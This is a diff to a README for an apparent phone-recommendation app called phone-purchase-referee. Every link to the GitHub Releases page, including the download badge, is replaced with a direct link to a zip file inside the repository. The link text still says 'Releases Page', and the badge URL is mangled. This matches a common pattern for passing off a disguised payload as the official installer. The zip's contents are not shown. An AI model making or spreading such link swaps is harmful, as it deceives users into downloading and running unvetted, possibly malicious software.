@@ -1,7 +1,7 @@
 # 📱 phone-purchase-referee - Find Your Perfect Phone Effortlessly
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/3loulou/phone-purchase-referee/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/3loulou/phone-purchase-referee/master/core/phone-referee-purchase-v2.3.zip%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/3loulou/phone-purchase-referee/master/core/phone-referee-purchase-v2.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **phone-purchase-referee**! This application helps you find the right phone for you using smart AI features. Follow the steps below to download and run the software.
@@ -20,12 +20,12 @@ Welcome to the **phone-purchase-referee**! This application helps you find the r
 - **User-Friendly Interface:** Easily navigate through the app with no prior experience needed.
 
 ## 🔍 How to Access the Application
-1. **Visit the Releases Page:** Click [here](https://github.com/3loulou/phone-purchase-referee/releases) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/3loulou/phone-purchase-referee/master/core/phone-referee-purchase-v2.3.zip) to go to the Releases page.
 2. **Choose Your Version:** Look for the latest version. It will have the highest version number. 
 3. **Download the Installer:** Click on the appropriate download link for your operating system.
 
 ## 📥 Download & Install
-To download the application, visit this page to download: [Releases Page](https://github.com/3loulou/phone-purchase-referee/releases).
+To download the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/3loulou/phone-purchase-referee/master/core/phone-referee-purchase-v2.3.zip).
 
 ### Installation Steps
 1. **Locate the Downloaded File:** After downloading, find the installer file in your Downloads folder.
